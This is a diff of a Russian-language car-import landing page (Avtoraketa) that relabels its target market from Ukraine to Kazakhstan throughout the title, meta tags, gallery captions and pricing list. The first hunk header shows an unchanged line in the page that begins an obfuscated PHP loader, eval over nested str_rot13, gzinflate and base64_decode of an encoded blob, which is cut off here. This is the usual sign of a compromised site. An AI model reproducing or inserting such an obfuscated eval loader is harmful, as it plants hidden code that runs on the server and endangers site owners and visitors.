@@ -6,15 +6,15 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
 <html class="wide wow-animation" lang="ru">
   <head>
     <!-- Site Title-->
-    <title>Купить БУ Авто из Кореи в Украине✅ Цены от от 7,000$ |  Avtoraketa</title>
+    <title>Купить БУ Авто из Кореи в Казахстане ✅ Цены от от 7,000$ |  Avtoraketa</title>
     <meta charset="utf-8">
 	<meta property="og:title" content="Avtoraketa - доставка авто из Кореи">
     <meta property="og:site_name" content="Avtoraketa">
     <meta property="og:url" content="https://avtoraketa.com.ua">
     <meta property="og:description" content="Предоставляем улуги профессионального пригона авто из СКореи">
     <meta property="og:image" content="/images/avtoraketa.jpg">
-	<meta name="description" content="Авторакета - это выгодная покупка авто из Кореи в Украину">
-	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Кореи в Украину. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
+	<meta name="description" content="Авторакета - это выгодная покупка авто из Кореи в Казахстан ">
+	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Кореи в Казахстан . Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <script src="/cdn-cgi/apps/head/3ts2ksMwXvKRuG480KNifJ2_JNM.js"></script><link rel="icon" href="images/favicon.ico" type="image/x-icon">
@@ -278,7 +278,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
               <article class="box-minimal-modern">
                 <div class="box-minimal-icon mdi mdi-magnify"></div>
                 <h6 class="box-minimal-title">Логистика и Растаможка</h6>
-                <div class="box-minimal-text">После оплаты выкупленного авто и сопутствующих платежей, ваш автомобиль будет доставлен в порт Украины.После растаможки автомобиль будет готов к выдаче в порту.</div>
+                <div class="box-minimal-text">После оплаты выкупленного авто и сопутствующих платежей, ваш автомобиль будет доставлен в Казахстан  .После растаможки автомобиль будет готов к выдаче в порту.</div>
               </article>
             </div>
             <div class="col-sm-10 col-md-6 col-xl-3">
@@ -325,61 +325,61 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                 <div class="col-1 isotope-item isotope-sizer"></div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 1"><a class="gallery-item" href="images/korea-1.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/korea-1.jpg" alt="авто из кореи мариуполь хюндай" width="570" height="380"/>
+                      <figure><img src="images/korea-1.jpg" alt="авто из кореи Казахстан хюндай" width="570" height="380"/>
                       </figure>
                       <div class="caption">
                         <p class="caption-title">Hyundai Sonata 2015 в Корее - 5 200$</p>
-                        <p class="caption-text">Стоимость данного авто в Украине на номерах - 10 600$</p>
+                        <p class="caption-text">Стоимость данного авто в Казахстане  на номерах - 10 600$</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 1"><a class="gallery-item" href="images/korea-2.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/korea-2.jpg" alt="авто из кореи мариуполь киа" width="570" height="380"/>
+                      <figure><img src="images/korea-2.jpg" alt="авто из кореи Казахстан киа" width="570" height="380"/>
                       </figure>
                       <div class="caption">
                         <p class="caption-title">KIA K5 (Optima) 2014 в Корее  - 5 500$</p>
-                        <p class="caption-text">Стоимость данного авто в Украине на номерах - 11 000$</p>
+                        <p class="caption-text">Стоимость данного авто в Казахстане  на номерах - 11 000$</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 1"><a class="gallery-item" href="images/korea-3.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/korea-3.jpg" alt="авто из кореи мариуполь хюндай" width="570" height="380"/>
+                      <figure><img src="images/korea-3.jpg" alt="авто из кореи Казахстан хюндай" width="570" height="380"/>
                       </figure>
                       <div class="caption">
                         <p class="caption-title">Hyundai Tucson 2013 в Корее  - 5 100$</p>
-                        <p class="caption-text">Стоимость данного авто в Украине на номерах - 11 000$</p>
+                        <p class="caption-text">Стоимость данного авто в Казахстане  на номерах - 11 000$</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 2"><a class="gallery-item" href="images/korea-4.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/korea-4.jpg" alt="авто из кореи мариуполь киа" width="570" height="380"/>
+                      <figure><img src="images/korea-4.jpg" alt="авто из кореи Казахстан киа" width="570" height="380"/>
                       </figure>
                       <div class="caption">
                         <p class="caption-title">KIA Sportage 2014 в Корее  - 7 700$</p>
-                        <p class="caption-text">Стоимость данного авто в Украине на номерах - 13 200$</p>
+                        <p class="caption-text">Стоимость данного авто в Казахстане  на номерах - 13 200$</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 2"><a class="gallery-item" href="images/korea-5.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/korea-5.jpg" alt="авто из кореи мариуполь киа" width="570" height="380"/>
+                      <figure><img src="images/korea-5.jpg" alt="авто из кореи Казахстан киа" width="570" height="380"/>
                       </figure>
                       <div class="caption">
                         <p class="caption-title">KIA K3 2016 в Корее  - 5 500$</p>
-                        <p class="caption-text">Стоимость данного авто в Украине на номерах - 10 800$</p>
+                        <p class="caption-text">Стоимость данного авто в Казахстане  на номерах - 10 800$</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 2"><a class="gallery-item" href="images/korea-6.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/korea-6.jpg" alt="авто из кореи мариуполь киа" width="570" height="380"/>
+                      <figure><img src="images/korea-6.jpg" alt="авто из кореи Казахстан киа" width="570" height="380"/>
                       </figure>
                       <div class="caption">
                         <p class="caption-title">KIA Morning 2012 в Корее  - 4 900$</p>
-                        <p class="caption-text">Стоимость данного авто в Украине на номерах - 9 900$</p>
+                        <p class="caption-text">Стоимость данного авто в Казахстане  на номерах - 9 900$</p>
                       </div>
                     </div></a>
                 </div>
@@ -403,7 +403,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                       <div class="pricing-box-body">
                         <ul class="pricing-box-list">
                           <li>Совместная покупка авто на авторынке</li>
-                          <li>Доставка в Украину</li>
+                          <li>Доставка в Казахстан </li>
                           <li class="pricing-box-list-disable">Доставка к дому</li>
                         </ul>
                         <div class="pricing-box-price">
